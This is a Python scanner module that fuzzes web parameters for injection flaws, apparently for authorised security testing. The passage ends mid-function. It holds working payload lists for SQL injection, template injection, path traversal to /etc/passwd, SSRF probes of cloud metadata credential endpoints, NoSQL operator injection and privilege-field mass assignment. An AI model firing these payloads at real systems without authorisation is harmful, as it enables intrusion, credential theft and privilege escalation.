#!/usr/bin/env python3
"""
Briar Inspector Worker
======================
Smart pre-exploitation triage fuzzer.  Sits between the FUZZ phase and
DAST/EXPLOIT.  For each high-value (endpoint, parameter) pair it:

  1. Establishes a clean baseline response
  2. Sends lightweight canary payloads tuned to the parameter's semantic type
  3. Compares responses (body diff, status change, size delta, timing)
  4. Emits structured candidates that the orchestrator routes to specialized tools:
       sqli_candidate   → sqlmap
       ssti_candidate   → tplmap
       cmdi_candidate   → commix
       path_traversal   → nuclei (path-traversal templates)
       open_redirect    → nuclei (redirect templates)
       xss_candidate    → dalfox

Queue:  scan.inspect.inspector
Phase:  inspect  (after fuzz, before dast)

Detection methods per finding type
-----------------------------------
  sqli_candidate
    • Error-based   – DB error keywords in response body
    • Boolean-based – true condition ≈ baseline, false condition ≠ baseline
    • Time-based    – response time > baseline + TIMING_THRESHOLD

  ssti_candidate
    • Math eval     – inject {{7*7}}, ${7*7}, #{7*7} etc. → "49" in response
    • Engine tag    – specific engine error strings in response

  cmdi_candidate
    • Output reflection – inject unique random echo marker → marker in response
    • Blind via timing  – inject sleep command → response delay

  path_traversal
    • Content reflection – inject ../../etc/passwd → "root:" pattern in response

  open_redirect
    • Location header – inject redirect target → Location header reflects injected URL

  xss_candidate
    • HTML reflection – inject unique tag → unescaped in response body
"""

import asyncio
import hashlib
import json
import logging
import os
import random
import re
import secrets
import string
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../")))

from shared.worker_base import BaseWorker
from shared.models import SeverityLevel
from shared.app_strategies import get_strategy

try:
    import httpx
    _HTTPX_AVAILABLE = True
except ImportError:
    _HTTPX_AVAILABLE = False
    httpx = None  # type: ignore

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("inspector-worker")

# ── Tuning ─────────────────────────────────────────────────────────────────────

MAX_ENDPOINTS      = int(os.getenv("INSPECTOR_MAX_ENDPOINTS",  "300"))
MAX_PARAMS_PER_EP  = int(os.getenv("INSPECTOR_MAX_PARAMS",     "15"))
REQUEST_TIMEOUT    = float(os.getenv("INSPECTOR_TIMEOUT",      "10"))
TIMING_THRESHOLD   = float(os.getenv("INSPECTOR_TIMING_DELTA", "2.5"))  # seconds
MAX_CONCURRENCY    = int(os.getenv("INSPECTOR_CONCURRENCY",    "20"))
BOOL_DIFF_RATIO    = float(os.getenv("INSPECTOR_BOOL_DIFF",    "0.15"))  # ≥15% diff = suspicious


# ── Parameter semantic classification ─────────────────────────────────────────

# Each set assigns a vulnerability-type score weight to a parameter name.
# A parameter can be in multiple sets (e.g. "id" → SQL + IDOR).

# Parameter name dictionaries removed — vulnerability type is now determined
# by behavioral probe signals, not by parameter names. See universal_probe().

# ── JWT detection pattern ─────────────────────────────────────────────────────
# Three base64url segments: header.payload.signature
# JWT headers always start with eyJ (base64url of '{"')
_JWT_RE = re.compile(
    r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",
    re.ASCII,
)

# JSON keys that commonly hold access tokens
_JWT_JSON_KEYS = frozenset({
    "token", "access_token", "accessToken", "id_token", "idToken",
    "jwt", "bearer", "auth_token", "authToken", "refresh_token", "refreshToken",
})

# ── SQL error detection patterns ───────────────────────────────────────────────

_SQL_ERROR_RE = re.compile(
    r"(?:"
    # MySQL / MariaDB
    r"you have an error in your sql syntax"
    r"|warning:\s*mysql"
    r"|mariadb server version for the right syntax"
    r"|com\.mysql\.jdbc\."
    r"|operationalerror.*mysql"
    r"|hy000.*1064"
    # PostgreSQL
    r"|unclosed quotation mark"
    r"|quoted string not properly terminated"
    r"|pg::syntaxerror"
    r"|pg::undefinedcolumn"
    r"|org\.postgresql\.util\.psqlexception"
    r"|psql.*error"
    r"|operationalerror.*psycopg"
    # MSSQL
    r"|microsoft ole db provider for sql server"
    r"|incorrect syntax near"
    r"|system\.data\.sqlclient"
    r"|sql server.*error"
    r"|unclosed quotation mark after"
    # Oracle
    r"|ora-\d{4,5}"
    # SQLite (native + Python)
    r"|sqlite.*(?:error|exception)"
    r"|operationalerror.*sqlite"
    r"|sqlite_error"
    r"|incomplete input"         # SQLite: unmatched quote → "incomplete input"
    r"|unrecognized token"       # SQLite: invalid token in expression
    r"|no such column"           # SQLite: column name injection artifact
    # Node.js / Sequelize ORM (wraps SQLite, MySQL, Postgres)
    r"|sequelizedatabaseerror"
    r"|sequelizevalidationerror"
    r"|sequelizeuniqueconstrainterror"
    r"|sequelizeeagerloadingerror"
    r"|sequelizeforeignkeyconstrainterror"
    # Generic ORM / framework errors
    r"|unexpected end of sql command"
    r"|odbc.*(?:driver|error)"
    r"|jdbc.*exception"
    r"|sqlsyntaxerrorexception"
    r"|pdo.*sqlstate"
    r"|db2 sql error"
    # Python ORMs (SQLAlchemy, Django ORM)
    r"|django\.db\.utils"
    r"|sqlalchemy.*error"
    r"|operationalerror"         # broad Python DB-API catch
    r")",
    re.IGNORECASE,
)

# ── SSTI canaries ──────────────────────────────────────────────────────────────

# Each entry: (payload, expected_result, engine_hint)
# We inject the payload and look for expected_result in the response body.
SSTI_CANARIES: List[Tuple[str, str, str]] = [
    # Python template engines
    ("{{7*7}}",           "49",       "Jinja2/Twig/Nunjucks"),
    ("{{7*'7'}}",         "7777777",  "Jinja2"),          # Jinja2: '7'*7 = '7777777'
    ("{#7*7}",            "49",       "Smarty3"),
    ("{$smarty.version}", "Smarty",   "Smarty"),
    # Java template engines
    ("${7*7}",            "49",       "FreeMarker/Groovy/Spring EL"),
    ("${{7*7}}",          "49",       "Spring EL"),
    # Ruby
    ("#{7*7}",            "49",       "Ruby ERB/Slim"),
    ("<%= 7*7 %>",        "49",       "ERB"),
    # Node.js / Express template engines (Pug, EJS, Handlebars, Lodash)
    ("#{7*7}",            "49",       "Pug/Jade"),        # Pug: #{expr} evaluates JS
    ("<%= 7*7 %>",        "49",       "EJS"),             # EJS: <%= expr %>
    ("{{= 7*7}}",         "49",       "Lodash/Underscore"),  # _.template with {{= }}
    # Generic math to catch unknown engines
    ("%{7*7}",            "49",       "Generic"),
    ("*{7*7}",            "49",       "Thymeleaf"),
]

_SSTI_ENGINE_RE = re.compile(
    r"(?:jinja2|twig|freemarker|smarty|erb|thymeleaf|velocity|pebble|nunjucks|"
    r"pug|jade|handlebars|mustache|ejs|lodash|"
    r"TemplateEngine|TemplateNotFound|TemplateSyntaxError|"
    r"SyntaxError.*unexpected|ReferenceError.*not defined|"     # Node.js template errors
    r"TypeError.*Cannot read|EvalError)",
    re.IGNORECASE,
)

# ── Path traversal patterns ────────────────────────────────────────────────────

PATH_TRAVERSAL_CANARIES = [
    ("../../etc/passwd",        "unix"),
    ("../../../etc/passwd",     "unix"),
    ("....//....//etc/passwd",  "unix"),
    ("%2e%2e%2fetc%2fpasswd",   "unix"),
    ("..\\..\\windows\\win.ini","win"),
    ("%2e%2e\\windows\\win.ini","win"),
]

_PATH_TRAVERSAL_RE = re.compile(
    r"(?:root:.*:0:0:|nobody:.*:/|daemon:.*:/|"
    r"\[boot loader\]|for 16-bit app support|"
    r"\[fonts\]|windows\\system32)",
    re.IGNORECASE,
)

# ── SQL boolean canaries ───────────────────────────────────────────────────────
#
# Payloads are PREFIXED to the original value so the query context is preserved.
# e.g. original q=apple →
#   TRUE:  q=apple' AND '1'='1    → WHERE name LIKE '%apple' AND '1'='1%' → results
#   FALSE: q=apple' AND '1'='2    → WHERE name LIKE '%apple' AND '1'='2%' → empty
#
# For numeric params (id=1):
#   TRUE:  id=1 AND 1=1           → same result as baseline
#   FALSE: id=1 AND 1=2           → no result (integer out of range or filtered)

def _make_bool_payloads(original_val: str) -> Tuple[str, str]:
    """Return (true_payload, false_payload) for boolean-based SQLi detection."""
    is_numeric = original_val.lstrip("-").isdigit()
    if is_numeric:
        return (
            f"{original_val} AND 1=1",
            f"{original_val} AND 1=2",
        )
    else:
        return (
            f"{original_val}' AND '1'='1",
            f"{original_val}' AND '1'='2",
        )


# ── SQL error-trigger canaries ─────────────────────────────────────────────────
# Single-character probes that trigger DB errors on most backends.
SQL_ERROR_PROBES = ("'", '"', "')", "'))", "';--", '";--', "\\", "%27")

# ── SQL time-based canaries ────────────────────────────────────────────────────
# Inject delays across all common DB backends.
# SQLite doesn't have SLEEP() — use heavy randomblob() computation instead.
SQL_TIME_CANARIES = [
    # MySQL / MariaDB
    "1 AND SLEEP(1)--",
    "1 OR SLEEP(1)--",
    "' AND SLEEP(1)--",
    "' OR SLEEP(1)--",
    # MSSQL
    "1; WAITFOR DELAY '0:0:1'--",
    "'; WAITFOR DELAY '0:0:1'--",
    # PostgreSQL
    "1 AND pg_sleep(1)--",
    "' AND pg_sleep(1)--",
    # SQLite — randomblob generates enough work to cause measurable delay
    # without needing SLEEP (which SQLite doesn't support).
    "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
]


# ── Data structures ────────────────────────────────────────────────────────────

@dataclass
class Baseline:
    status:  int
    body:    str
    size:    int
    time_ms: float


@dataclass
class EndpointTarget:
    url:        str
    method:     str
    params:     Dict[str, List[str]]   # name → [current value] for query/form params
    json_body:  Dict[str, Any] = field(default_factory=dict)  # JSON body template for REST API
    score:      int = 0
    vuln_types: List[str] = field(default_factory=list)


# ── Scoring ────────────────────────────────────────────────────────────────────

def score_endpoint(url: str, params: Dict[str, List[str]]) -> Tuple[int, List[str]]:
    """
    Priority score for scheduling — higher = test first.
    Vulnerability types are no longer pre-assigned from param names;
    universal_probe() determines them from application behavior at runtime.
    """
    score = 0
    path = urlparse(url).path.lower()

    _HIGH_VALUE = (
        "/api/", "/rest/", "/v1/", "/v2/", "/v3/", "/v4/",
        "/admin", "/user", "/auth", "/login", "/search",
        "/upload", "/import", "/export", "/eval", "/exec",
        "/render", "/template", "/run", "/debug",
    )
    for prefix in _HIGH_VALUE:
        if prefix in path:
            score += 3
            break

    # Legacy/interpreted path extensions
    if re.search(r"\.(php|asp|aspx|jsp|cfm|cgi)$", path):
        score += 2

    # Integer path segments → IDOR / injection surface
    parts = [s for s in path.split("/") if s]
    if any(s.isdigit() for s in parts):
        score += 2

    # More params = more attack surface
    score += min(len(params), 5)

    # vuln_types is now always empty — universal_probe() decides at runtime
    return score, []


# ── HTTP helpers ───────────────────────────────────────────────────────────────

def _build_headers(auth_context: Dict[str, Any]) -> Dict[str, str]:
    headers: Dict[str, str] = {
        "User-Agent": "Mozilla/5.0 (compatible; Briar-Inspector/1.0)",
    }
    headers.update(auth_context.get("headers", {}))
    cookies = auth_context.get("cookies", [])
    if cookies:
        headers["Cookie"] = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
    return headers


def _inject_param(
    url: str,
    params: Dict[str, List[str]],
    param_name: str,
    payload: str,
    method: str = "GET",
) -> Tuple[str, Optional[Dict[str, str]]]:
    """
    Return (modified_url, post_data) with payload injected into param_name.
    For GET: encodes into query string.  For POST: returns as form dict.
    """
    modified = dict(params)
    modified[param_name] = [payload]

    if method.upper() == "GET":
        p = urlparse(url)
        new_qs = urlencode({k: v[0] for k, v in modified.items()})
        new_url = urlunparse(p._replace(query=new_qs))
        return new_url, None
    else:
        return url, {k: v[0] for k, v in modified.items()}


def _inject_json_field(
    body: Dict[str, Any],
    field_name: str,
    payload: str,
) -> Dict[str, Any]:
    """Return a copy of JSON body with payload injected into field_name."""
    modified = dict(body)
    modified[field_name] = payload
    return modified


async def _request(
    client: "httpx.AsyncClient",
    method: str,
    url: str,
    data: Optional[Dict] = None,
    timeout: float = REQUEST_TIMEOUT,
    json_body: bool = False,
) -> Optional[Tuple[int, str, float]]:
    """Returns (status, body, elapsed_seconds) or None on error."""
    try:
        t0 = time.monotonic()
        if method.upper() == "POST" and data:
            if json_body:
                resp = await client.post(url, json=data, timeout=timeout)
            else:
                resp = await client.post(url, data=data, timeout=timeout)
        else:
            resp = await client.get(url, timeout=timeout)
        elapsed = time.monotonic() - t0
        body = resp.text
        return resp.status_code, body, elapsed
    except Exception as exc:
        logger.debug(f"Request failed {url}: {exc}")
        return None


def _body_diff_ratio(base: str, modified: str) -> float:
    """Rough content-similarity ratio — 0.0 = identical, 1.0 = totally different."""
    if not base and not modified:
        return 0.0
    if not base or not modified:
        return 1.0
    if base == modified:
        return 0.0
    longer = max(len(base), len(modified))
    shorter = min(len(base), len(modified))
    return 1.0 - (shorter / longer)


# ── Universal Probe Pipeline ───────────────────────────────────────────────────
#
# Replaces name-based vulnerability type assignment.  Every parameter goes
# through 3 lightweight probe requests; the application's behavioral response
# determines which targeted detectors are invoked.
#
# ProbeSignals carries all behavioral observations collected during the probe
# phase.  _test_one() reads these signals to dispatch only the detectors that
# are supported by evidence — no wasted requests, no missed coverage.

@dataclass
class ProbeSignals:
    reflects_canary:    bool = False
    reflection_ctx:     str  = "none"  # html | json | text | script | attr | none
    quote_triggers_err: bool = False
    db_error_found:     bool = False
    template_eval:      bool = False
    timing_anomaly:     bool = False
    status_changed:     bool = False
    value_is_url:       bool = False   # current param value is a URL


def _classify_reflection_ctx(canary: str, body: str) -> str:
    """Classify where in the response body the canary appears."""
    idx = body.find(canary)
    if idx == -1:
        return "none"
    before = body[max(0, idx - 80):idx]
    after  = body[idx + len(canary): idx + len(canary) + 80]
    ctx = (before + after).lower()

    if re.search(r"<script[^>]*>", before, re.I) or "javascript:" in ctx:
        return "script"
    if re.search(r"<[a-z][^>]*\s[\w-]+=\s*[\"']?\s*$", before, re.I):
        return "attr"
    if "<" in before or ">" in after:
        return "html"
    if re.search(r'["\'][\s]*:', before):
        return "json"
    return "text"


async def universal_probe(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
    baseline: Baseline,
) -> ProbeSignals:
    """
    Run 3 lightweight probes against param_name and return behavioral signals.

    Probe 1 — Canary reflection: unique alphanumeric string → where does it appear?
    Probe 2 — Syntax sensitivity: quote, template marker, HTML tag sent in parallel.
    Probe 3 — Timing anomaly: only when Probe 2 showed a signal (avoids slow scans).
    """
    sig = ProbeSignals()
    canary = "BRIAR" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

    # ── Probe 1: canary reflection ─────────────────────────────────────────
    inj_url, post_data = _inject_param(url, params, param_name, canary, method)
    r = await _request(client, method, inj_url, post_data)
    if r:
        _, body, _ = r
        if canary in body:
            sig.reflects_canary = True
            sig.reflection_ctx  = _classify_reflection_ctx(canary, body)

    # ── Probe 2: syntax sensitivity (3 probes in parallel) ────────────────
    syntax_payloads = ["'", '"{{7*7}}', "<briar-probe>"]
    tasks = [
        _request(client, method, *_inject_param(url, params, param_name, p, method)[:2])
        for p in syntax_payloads
    ]
    probe_results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, res in enumerate(probe_results):
        if isinstance(res, Exception) or res is None:
            continue
        s, body, _ = res
        if s != baseline.status or abs(len(body) - baseline.size) > 50:
            sig.status_changed = True
        if _SQL_ERROR_RE.search(body):
            sig.db_error_found = True
        if i == 1 and "49" in body:   # '"{{7*7}}' → template evaluated
            sig.template_eval = True

    # ── Probe 3: timing (only when syntax showed something interesting) ────
    if sig.db_error_found or sig.status_changed:
        t_inj, t_post = _inject_param(url, params, param_name, "' AND SLEEP(1)--", method)
        t_r = await _request(client, method, t_inj, t_post, timeout=REQUEST_TIMEOUT + 3)
        if t_r:
            _, _, elapsed = t_r
            if elapsed - (baseline.time_ms / 1000.0) >= 1.5:
                sig.timing_anomaly = True

    # ── Context: does current value look like a URL? ───────────────────────
    orig = (params.get(param_name) or [""])[0]
    if orig.startswith(("http://", "https://", "//")):
        sig.value_is_url = True

    return sig


async def universal_probe_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    field_name: str,
    baseline: Baseline,
) -> ProbeSignals:
    """Same as universal_probe but injects into a JSON body field."""
    sig = ProbeSignals()
    canary = "BRIAR" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

    # Probe 1: canary reflection
    r = await _request(client, "POST", url,
                       data=_inject_json_field(json_body, field_name, canary),
                       json_body=True)
    if r:
        _, body, _ = r
        if canary in body:
            sig.reflects_canary = True
            sig.reflection_ctx  = _classify_reflection_ctx(canary, body)

    # Probe 2: syntax sensitivity (parallel)
    syntax_payloads = ["'", '"{{7*7}}', "<briar-probe>"]
    tasks = [
        _request(client, "POST", url,
                 data=_inject_json_field(json_body, field_name, p),
                 json_body=True)
        for p in syntax_payloads
    ]
    probe_results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, res in enumerate(probe_results):
        if isinstance(res, Exception) or res is None:
            continue
        s, body, _ = res
        if s != baseline.status or abs(len(body) - baseline.size) > 50:
            sig.status_changed = True
        if _SQL_ERROR_RE.search(body):
            sig.db_error_found = True
        if i == 1 and "49" in body:
            sig.template_eval = True

    # Probe 3: timing
    if sig.db_error_found or sig.status_changed:
        t_r = await _request(client, "POST", url,
                             data=_inject_json_field(json_body, field_name, "' AND SLEEP(1)--"),
                             json_body=True,
                             timeout=REQUEST_TIMEOUT + 3)
        if t_r:
            _, _, elapsed = t_r
            if elapsed - (baseline.time_ms / 1000.0) >= 1.5:
                sig.timing_anomaly = True

    # URL context
    field_val = json_body.get(field_name, "")
    if isinstance(field_val, str) and field_val.startswith(("http://", "https://", "//")):
        sig.value_is_url = True

    return sig


# ── SSRF detection ─────────────────────────────────────────────────────────────

_SSRF_PROBES: List[Tuple[str, List[str]]] = [
    ("http://169.254.169.254/latest/meta-data/",
     ["ami-id", "instance-id", "local-ipv4", "placement", "security-credentials"]),
    ("http://169.254.169.254/metadata/v1/",
     ["hostname", "interfaces", "droplet_id"]),            # DigitalOcean
    ("http://metadata.google.internal/computeMetadata/v1/",
     ["computeMetadata", "instance", "project"]),          # GCP
    ("http://100.100.100.200/latest/meta-data/",
     ["instance-id", "mac"]),                              # Aliyun ECS
    ("http://127.0.0.1:6379/",
     ["-ERR", "+OK", "PONG", "redis_version"]),            # Redis
    ("http://127.0.0.1:27017/",
     ["MongoDB", "ismaster", "\"ok\"", "serverStatus"]),  # MongoDB
    ("http://127.0.0.1:9200/",
     ["elasticsearch", "cluster_name", "\"version\""]),   # Elasticsearch
    ("http://127.0.0.1:11211/",
     ["VERSION", "STAT pid", "END\r\n"]),                  # Memcached
]


async def _detect_ssrf(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """SSRF detection via internal service probes."""
    for probe_url, indicators in _SSRF_PROBES:
        inj_url, post_data = _inject_param(url, params, param_name, probe_url, method)
        r = await _request(client, method, inj_url, post_data, timeout=REQUEST_TIMEOUT)
        if r is None:
            continue
        status, body, _ = r
        body_lower = body.lower()
        for indicator in indicators:
            if indicator.lower() in body_lower:
                return {
                    "detection": "internal-service-response",
                    "probe_url": probe_url,
                    "payload":   probe_url,
                    "evidence": (
                        f"SSRF: server fetched {probe_url!r}, "
                        f"response contains {indicator!r}"
                    ),
                }
    return None


async def _detect_ssrf_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    field_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """SSRF detection for JSON body fields."""
    for probe_url, indicators in _SSRF_PROBES:
        r = await _request(client, "POST", url,
                           data=_inject_json_field(json_body, field_name, probe_url),
                           json_body=True,
                           timeout=REQUEST_TIMEOUT)
        if r is None:
            continue
        _, body, _ = r
        body_lower = body.lower()
        for indicator in indicators:
            if indicator.lower() in body_lower:
                return {
                    "detection": "internal-service-response",
                    "probe_url": probe_url,
                    "payload":   probe_url,
                    "evidence": (
                        f"SSRF (JSON body): server fetched {probe_url!r}, "
                        f"response contains {indicator!r}"
                    ),
                }
    return None


# ── NoSQL injection detection ──────────────────────────────────────────────────

_NOSQL_ERROR_RE = re.compile(
    r"(?:mongodb|mongoose|bson|objectid|casttoobjectid|"
    r"mongoclient|mongodberror|bulkwriteerror|"
    r"\$where|\$expr|operator.*not allowed|"
    r"expected string.*got object|"
    r"bad \$push|bad \$set|bad \$pull)",
    re.IGNORECASE,
)


async def _detect_nosql(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """
    NoSQL injection via MongoDB operator injection.

    Tests two surfaces:
      - Query-string array syntax:  ?field[$ne]=x  (Express/qs parses to {field:{$ne:"x"}})
      - JSON body (handled separately by _detect_nosql_json)
    """
    p = urlparse(url)
    base_qs = {k: v[0] for k, v in params.items()}

    # ── Test 1: $ne operator ─────────────────────────────────────────────
    ne_qs = dict(base_qs)
    ne_qs[f"{param_name}[$ne]"] = "briar_nosql_probe_xyz"
    ne_qs.pop(param_name, None)
    ne_url = urlunparse(p._replace(query=urlencode(ne_qs)))
    r = await _request(client, "GET", ne_url)
    if r:
        status, body, _ = r
        if _NOSQL_ERROR_RE.search(body):
            m = _NOSQL_ERROR_RE.search(body)
            return {
                "detection": "nosql-error",
                "payload":   f"{param_name}[$ne]=briar_nosql_probe_xyz",
                "evidence":  f"NoSQL error keyword: {m.group(0)!r}",
            }
        # $ne returned MORE data than baseline → filter bypass
        if status == baseline.status and len(body) > baseline.size + 100:
            return {
                "detection": "operator-bypass",
                "payload":   f"{param_name}[$ne]=briar_nosql_probe_xyz",
                "evidence": (
                    f"$ne operator returned {len(body)} bytes vs "
                    f"baseline {baseline.size} bytes — NoSQL filter bypass"
                ),
            }

    # ── Test 2: $regex wildcard ──────────────────────────────────────────
    regex_qs = dict(base_qs)
    regex_qs[f"{param_name}[$regex]"] = ".*"
    regex_qs.pop(param_name, None)
    regex_url = urlunparse(p._replace(query=urlencode(regex_qs)))
    r2 = await _request(client, "GET", regex_url)
    if r2:
        status2, body2, _ = r2
        if status2 == 200 and len(body2) > baseline.size + 100:
            return {
                "detection": "regex-bypass",
                "payload":   f"{param_name}[$regex]=.*",
                "evidence": (
                    f"$regex wildcard returned {len(body2)} bytes "
                    f"vs {baseline.size} baseline — NoSQL regex injection"
                ),
            }

    return None


async def _detect_nosql_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    field_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """NoSQL injection via JSON body — inject MongoDB operator objects."""
    nosql_payloads = [
        {"$ne": "briar_nosql_probe_xyz"},
        {"$gt": ""},
        {"$regex": ".*", "$options": "i"},
        {"$where": "1==1"},
    ]
    for operator_obj in nosql_payloads:
        modified = dict(json_body)
        modified[field_name] = operator_obj
        r = await _request(client, "POST", url, data=modified, json_body=True)
        if r is None:
            continue
        status, body, _ = r
        if _NOSQL_ERROR_RE.search(body):
            m = _NOSQL_ERROR_RE.search(body)
            return {
                "detection": "nosql-error-json",
                "payload":   str(operator_obj),
                "evidence":  f"NoSQL error in JSON response: {m.group(0)!r}",
            }
        if status == baseline.status and len(body) > baseline.size + 100:
            return {
                "detection": "operator-bypass-json",
                "payload":   str(operator_obj),
                "evidence": (
                    f"JSON NoSQL operator returned {len(body)} bytes "
                    f"vs {baseline.size} baseline — filter bypass"
                ),
            }
    return None


# ── Mass assignment detection ──────────────────────────────────────────────────

_PRIV_FIELDS = [
    "role", "admin", "isAdmin", "is_admin", "isAdministrator",
    "privilege", "privileges", "group", "groups",
    "permission", "permissions", "scope", "accessLevel",
    "level", "isStaff", "is_staff", "userType", "user_type",
    "verified", "isVerified", "is_verified",
]

_BONUS_FIELDS = [
    "credits", "loyaltyPoints", "creditPoints",
    "balance", "wallet", "discount",
]


async def _detect_mass_assignment_json(
    client: "httpx.AsyncClient",
    url: str,
    json_body: Dict[str, Any],
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """
    Mass assignment: inject privilege-escalating extra fields into a JSON body
    and look for behavioral signals that the server accepted them.

    Signal 1 — Reflection: sentinel value appears in response body.
    Signal 2 — Status upgrade: 4xx baseline becomes 2xx after injection.
    Signal 3 — Large numeric bonus field accepted (credits/balance).
    """
    sentinel = f"briar_priv_{secrets.token_hex(4)}"
    inject = {
        **json_body,
        **{f: sentinel for f in _PRIV_FIELDS},
        **{f: 999999 for f in _BONUS_FIELDS},
    }
    r = await _request(client, "POST", url, data=inject, json_body=True)
    if not r:
        return None
    status, body, _ = r

    if sentinel in body:
        accepted = [f for f in _PRIV_FIELDS if f in body]
        return {
            "detection": "field-reflection",
            "payload":   f"extra fields: {_PRIV_FIELDS[:4]}…",
            "evidence": (
                f"Injected privilege sentinel {sentinel!r} reflected in response. "
                f"Likely accepted fields: {accepted or 'unknown'}"
            ),
        }

    if baseline.status in (400, 403, 422) and status in (200, 201):
        return {
            "detection": "status-upgrade",
            "payload":   f"extra fields: {_PRIV_FIELDS[:4]}…",
            "evidence": (
                f"HTTP {baseline.status} → {status} after privilege field injection — "
                f"mass assignment may have elevated access"
            ),
        }

    return None


# ── Detection strategies ───────────────────────────────────────────────────────

async def _detect_sqli(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """
    SQL injection detection: error-based (body + status), boolean-based, time-based.
    """
    original_val = (params.get(param_name) or ["1"])[0]

    # ── Error-based: body + status ─────────────────────────────────────────
    for payload in SQL_ERROR_PROBES:
        inject_url, post_data = _inject_param(url, params, param_name, payload, method)
        result = await _request(client, method, inject_url, post_data)
        if result is None:
            continue
        status, body, _ = result

        # 1. SQL error string in response body
        if _SQL_ERROR_RE.search(body):
            m = _SQL_ERROR_RE.search(body)
            engine = m.group(0)[:80] if m else "unknown"
            return {
                "detection": "error-based",
                "payload": payload,
                "evidence": f"DB error keyword in response: {engine!r}",
            }

        # 2. Status changed from success to server error — strong injection signal
        # (Sequelize/ORM swallows the SQL error but still returns 500)
        if baseline.status in (200, 201) and status >= 500:
            return {
                "detection": "error-based-status",
                "payload": payload,
                "evidence": (
                    f"HTTP {baseline.status}→{status}: server error triggered by "
                    f"injection payload {payload!r} — likely unhandled DB exception"
                ),
            }

    # ── Boolean-based ──────────────────────────────────────────────────────
    # Payload is PREPENDED to the original value so the DB receives:
    #   WHERE col LIKE '%<original>' AND '1'='1%'   (true  → same result)
    #   WHERE col LIKE '%<original>' AND '1'='2%'   (false → empty result)
    true_payload, false_payload = _make_bool_payloads(original_val)

    r_true  = await _request(client, method, *_inject_param(url, params, param_name, true_payload,  method)[0:2])
    r_false = await _request(client, method, *_inject_param(url, params, param_name, false_payload, method)[0:2])

    if r_true and r_false:
        _, body_true,  _ = r_true
        _, body_false, _ = r_false

        true_vs_base  = _body_diff_ratio(baseline.body, body_true)
        false_vs_base = _body_diff_ratio(baseline.body, body_false)
        true_vs_false = _body_diff_ratio(body_true, body_false)

        # Classic boolean: true ≈ baseline, false ≠ baseline, true ≠ false
        if (true_vs_base < BOOL_DIFF_RATIO
                and false_vs_base >= BOOL_DIFF_RATIO
                and true_vs_false >= BOOL_DIFF_RATIO):
            return {
                "detection": "boolean-based",
                "payload": f"TRUE={true_payload!r} vs FALSE={false_payload!r}",
                "evidence": (
                    f"True≈baseline (diff={true_vs_base:.2f}), "
                    f"False≠baseline (diff={false_vs_base:.2f}) — "
                    f"content diverges on boolean condition change"
                ),
            }

        # Alternate: both differ from baseline but significantly differ from each other
        # Catches cases where true returns MORE data (e.g. OR 1=1 returning all rows)
        if (true_vs_false >= BOOL_DIFF_RATIO * 2
                and false_vs_base >= BOOL_DIFF_RATIO):
            return {
                "detection": "boolean-based-alt",
                "payload": f"TRUE={true_payload!r} vs FALSE={false_payload!r}",
                "evidence": (
                    f"Significant response difference between boolean conditions "
                    f"(true vs false diff={true_vs_false:.2f}) — consistent with SQLi"
                ),
            }

    # ── Time-based ─────────────────────────────────────────────────────────
    for payload in SQL_TIME_CANARIES:
        inject_url, post_data = _inject_param(url, params, param_name, payload, method)
        result = await _request(
            client, method, inject_url, post_data,
            timeout=REQUEST_TIMEOUT + 6,  # extra buffer for intentional delay
        )
        if result is None:
            continue
        _, _, elapsed = result
        delay = elapsed - (baseline.time_ms / 1000.0)
        if delay >= TIMING_THRESHOLD:
            return {
                "detection": "time-based",
                "payload": payload,
                "evidence": (
                    f"Response delayed by {delay:.2f}s (baseline: {baseline.time_ms:.0f}ms) "
                    f"— consistent with intentional SLEEP/WAITFOR injection"
                ),
            }

    return None


async def _detect_ssti(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
) -> Optional[Dict[str, Any]]:
    """SSTI detection via mathematical evaluation of injected expressions."""
    for payload, expected, engine in SSTI_CANARIES:
        inject_url, post_data = _inject_param(url, params, param_name, payload, method)
        result = await _request(client, method, inject_url, post_data)
        if result is None:
            continue
        _, body, _ = result
        if expected in body:
            return {
                "detection": "math-eval",
                "payload": payload,
                "evidence": (
                    f"Expression {payload!r} evaluated to {expected!r} in response — "
                    f"indicates {engine} template engine execution"
                ),
                "engine": engine,
            }
        if _SSTI_ENGINE_RE.search(body):
            m = _SSTI_ENGINE_RE.search(body)
            return {
                "detection": "engine-error",
                "payload": payload,
                "evidence": f"Template engine error leaked: {m.group(0)!r}",
                "engine": engine,
            }
    return None


async def _detect_cmdi(
    client: "httpx.AsyncClient",
    url: str,
    method: str,
    params: Dict[str, List[str]],
    param_name: str,
    baseline: Baseline,
) -> Optional[Dict[str, Any]]:
    """Command injection detection via unique echo marker reflection."""
